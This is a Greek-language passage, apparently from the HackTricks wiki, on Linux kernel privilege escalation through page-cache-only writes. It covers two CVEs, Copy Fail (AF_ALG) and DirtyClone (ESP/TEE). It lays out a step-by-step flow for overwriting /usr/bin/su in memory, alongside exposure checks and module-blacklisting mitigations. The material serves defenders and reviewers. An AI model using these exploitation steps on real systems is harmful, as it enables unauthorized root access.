Ορισμένα kernel bugs δεν τροποποιούν το αρχείο **στον δίσκο**. Αντίθετα, σας επιτρέπουν να τροποποιήσετε μόνο το αντίγραφο ενός αναγνώσιμου αρχείου στην **page cache**. Αν στοχεύσετε ένα binary **setuid** ή κάποιο άλλο binary που εκτελείται από το **root**, η επόμενη εκτέλεσή του μπορεί να τρέξει bytes ελεγχόμενα από τον attacker, που βρίσκονται στη μνήμη, και να κλιμακώσει τα προνόμια, παρόλο που το hash του αρχείου στον δίσκο δεν έχει αλλάξει.<sup>[[3]](#references)[[4]](#references)</sup>

Αυτό είναι χρήσιμο να το σκεφτείτε ως **primitive εγγραφής αρχείων μόνο κατά τον χρόνο εκτέλεσης**:<sup>[[3]](#references)</sup>

- **Ο δίσκος παραμένει καθαρός**: το inode και τα bytes στον δίσκο δεν αλλάζουν
- **Η μνήμη είναι τροποποιημένη**: οι διεργασίες που διαβάζουν ή εκτελούν τη cached page λαμβάνουν το τροποποιημένο από τον attacker περιεχόμενο
- **Η επίδραση είναι προσωρινή**: η αλλαγή εξαφανίζεται μετά από reboot ή eviction της cache

Αυτό το primitive βρίσκεται ανάμεσα στο κλασικό **arbitrary file write** και σε παλαιότερα bugs **page-cache abuse**, όπως τα Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Το Dirty COW βασιζόταν σε race
- Το Dirty Pipe είχε περιορισμούς στη θέση εγγραφής
- Ένα primitive που περιορίζεται στην page cache μπορεί να είναι πιο αξιόπιστο, αν η ευάλωτη διαδρομή επιτρέπει απευθείας εγγραφές σε cached pages που υποστηρίζονται από αρχεία

#### Γενική ροή privesc

1. Αποκτήστε ένα kernel primitive που μπορεί να γράψει σε **pages της page cache που υποστηρίζονται από αρχεία**
2. Χρησιμοποιήστε το εναντίον ενός **αναγνώσιμου προνομιούχου binary** ή άλλου αρχείου που εκτελείται από το root
3. Ενεργοποιήστε την εκτέλεση **πριν γίνει eviction της page από την cache**
4. Αποκτήστε code execution ως root, ενώ το αρχείο στον δίσκο εξακολουθεί να φαίνεται αμετάβλητο

Συνήθεις στόχοι υψηλής αξίας:

- Binaries **setuid-root**
- Helpers που εκκινούνται από **root services**
- Binaries που εκτελούνται συχνά από **containers που μοιράζονται τον kernel/page cache του host**

#### Παράδειγμα διαδρομής AF_ALG + `splice()`

Το Copy Fail (CVE-2026-31431) είναι ένα καλό παράδειγμα αυτής της κατηγορίας. Η ευάλωτη διαδρομή βρισκόταν στο Linux crypto userspace API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- Το `splice()` μπορεί να μεταφέρει references σε pages της page cache από ένα αναγνώσιμο αρχείο στο crypto TX scatterlist
- Η in-place διαδρομή decrypt του `algif_aead` επαναχρησιμοποιούσε τα source και destination buffers
- Στη συνέχεια, το `authencesn` έγραφε στην περιοχή του destination tag
- Όταν αυτή η περιοχή εξακολουθούσε να αναφέρεται σε spliced pages που υποστηρίζονταν από αρχείο, η εγγραφή κατέληγε στην **page cache του αρχείου-στόχου**

Επομένως, η ενδιαφέρουσα τεχνική δεν είναι το ίδιο το CVE, αλλά το μοτίβο:

- **τροφοδοτήστε ένα kernel subsystem με pages της cache που υποστηρίζονται από αρχεία**
- κάντε το subsystem να **τις χειρίζεται ως εγγράψιμη έξοδο**
- ενεργοποιήστε μια μικρή, ελεγχόμενη overwrite στη μνήμη

Το δημόσιο PoC χρησιμοποιούσε επαναλαμβανόμενες **εγγραφές 4 byte** για να τροποποιήσει το `/usr/bin/su` στη μνήμη και στη συνέχεια το εκτελούσε.<sup>[[4]](#references)[[7]](#references)</sup>

#### Παράδειγμα διαδρομής ESP / XFRM + netfilter TEE clone

Το DirtyClone (CVE-2026-43503) παρουσιάζει μια άλλη παραλλαγή του ίδιου μοτίβου **page-cache-only write-to-root**, αλλά αυτή τη φορά το sink είναι το **IPsec ESP decrypt** αντί για το `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Η σημαντική τεχνική είναι το **metadata-laundering step**:

- Το `splice()` τοποθετεί μια **read-only page της page cache που υποστηρίζεται από αρχείο** σε ένα πακέτο ESP-in-UDP
- Το αρχικό mitigation του DirtyFrag πρόσθετε στο skb το tag `SKBFL_SHARED_FRAG`, ώστε το `esp_input()` να **αντιγράφει πριν από το decrypt**
- Το netfilter `TEE` αντιγράφει το πακέτο μέσω των `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- Το clone διατηρεί το **ίδιο physical page-cache reference**, αλλά χάνει το `SKBFL_SHARED_FRAG`
- Το `esp_input()` θεωρεί τότε ότι το clone είναι ασφαλές και εκτελεί **in-place `cbc(aes)` decrypt** πάνω στη page που υποστηρίζεται από αρχείο

Το ευρύτερο μάθημα για τους reviewers ξεπερνά το συγκεκριμένο CVE: αν ένα mitigation βασίζεται σε **skb/page metadata** για να αποφασίσει αν πρέπει πρώτα να γίνει αντιγραφή, οποιαδήποτε **διαδρομή clone/copy που διατηρεί την backing page αλλά απορρίπτει τα metadata** μπορεί να επαναφέρει σιωπηρά το primitive εγγραφής.

Τυπική ροή exploitation:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` για να αποκτήσετε **`CAP_NET_ADMIN` μέσα σε ένα ιδιωτικό network namespace**
2. ενεργοποιήστε το loopback και εγκαταστήστε έναν κανόνα **netfilter `TEE`** στο `mangle/OUTPUT`
3. εγκαταστήστε **XFRM ESP transport SAs** μέσω `NETLINK_XFRM`
4. κωδικοποιήστε κάθε λέξη 4 byte-στόχο στο πεδίο `seq_hi` του SA (το word-selection trick του DirtyFrag)
5. στείλτε το spliced ESP-in-UDP packet, ώστε το **TEE clone** να φτάσει στο `esp_input()` και να εκτελέσει decrypt **in place**
6. επαναλάβετε μέχρι το αντίγραφο του `/usr/bin/su` στην page cache ή κάποιο άλλο προνομιούχο executable να περιέχει κώδικα ελεγχόμενο από τον attacker

Από επιχειρησιακή άποψη, η επίδραση είναι ίδια με εκείνη του παραδείγματος `AF_ALG`: το αρχείο στον δίσκο παραμένει καθαρό, αλλά το `execve()` καταναλώνει τα **τροποποιημένα bytes της page cache** και παρέχει root.<sup>[[8]](#references)[[9]](#references)</sup>

Χρήσιμοι έλεγχοι έκθεσης για αυτήν την παραλλαγή:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Η βραχυπρόθεσμη μείωση της επιφάνειας επίθεσης είναι και εδώ ειδική για κάθε διαδρομή: η αναβάθμιση σε kernel που περιλαμβάνει το `48f6a5356a33` διορθώνει τη διαδρομή clone, ενώ ο αποκλεισμός του autoload του `xt_TEE` αφαιρεί το **βήμα αλλοίωσης των flags** και ο αποκλεισμός των `esp4` / `esp6` αφαιρεί τον **στόχο αποκρυπτογράφησης**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Έκθεση και αναζήτηση

Αν υποψιάζεστε αυτό το είδος σφάλματος, μην βασίζεστε μόνο σε ελέγχους ακεραιότητας δίσκου. Επαληθεύστε επίσης:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Οι παρακάτω τιμές ρυθμίσεων διακρίνουν μια φορτώσιμη διεπαφή από μία ενσωματωμένη στον kernel· οι κανόνες build του crypto αντιστοιχίζουν το `CONFIG_CRYPTO_USER_API_AEAD` στο `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: το `algif_aead` μπορεί να φορτωθεί/αφαιρεθεί ως module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: η διεπαφή είναι ενσωματωμένη στον kernel
- τα setuid binaries είναι καλοί στόχοι, επειδή ένα patch μόνο στην page cache μπορεί να αρκεί για να μετατρέψει μια τοπική foothold σε root

#### Μείωση της επιφάνειας επίθεσης για τη διαδρομή `algif_aead`

Αν η ευάλωτη διεπαφή παρέχεται από φορτώσιμο module:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Αν έχει μεταγλωττιστεί στον πυρήνα, ορισμένες αναφορές περιγράφουν το μπλοκάρισμα της διαδρομής init με:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Αυτό το είδος mitigation αξίζει να το θυμάστε και για άλλες kernel LPEs: αν η εκμετάλλευση εξαρτάται από ένα συγκεκριμένο προαιρετικό interface, η απενεργοποίηση ή η προσθήκη του interface στη blacklist μπορεί να διακόψει τη διαδρομή του exploit, ακόμη και πριν γίνει διαθέσιμη μια πλήρης αναβάθμιση του kernel.<sup>[[6]](#references)[[28]](#references)</sup>



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [HTB Bamboo – υποκλοπή ενός script που εκτελείται ως root σε έναν κατάλογο PaperCut με δυνατότητα εγγραφής από χρήστες](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Συχνές ερωτήσεις για το Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Γνωστοποίηση του Openwall oss-security για το CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Διόρθωση του Linux stable: crypto: algif_aead - Επαναφορά σε λειτουργία out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — ενημερωτικό δελτίο για το CVE-2026-31431](https://copy.fail/)
- [7] [Τεχνική ανάλυση των Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Αποθετήριο DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Ανάλυση και εκμετάλλευση της παραλλαγής Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Διόρθωση Linux: net: skb: διατήρηση του `SKBFL_SHARED_FRAG` στο `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Προηγούμενο mitigation Linux: ορισμός του `SKBFL_SHARED_FRAG` για πακέτα UDP που έχουν υποστεί splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — εγχειρίδιο Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — εγχειρίδιο Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — εγχειρίδιο Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — τεκμηρίωση του Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Συσχετίσεις εφαρμογών MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Προδιαγραφή Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Προδιαγραφή Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Γλώσσα Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile του Linux crypto](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Ευπάθεια page cache του Linux kernel AF_ALG](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — εγχειρίδιο Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Τεκμηρίωση του Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Τεκμηρίωση του Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Τεκμηρίωση ρυθμίσεων του Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — εγχειρίδιο Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Τεκμηρίωση systemd generator](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Μηχανική ανίχνευσης Linux: μηχανισμοί persistence](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
- [37] [0xdf — HTB: MakeSense](https://0xdf.gitlab.io/2026/10/31/htb-makesense.html)
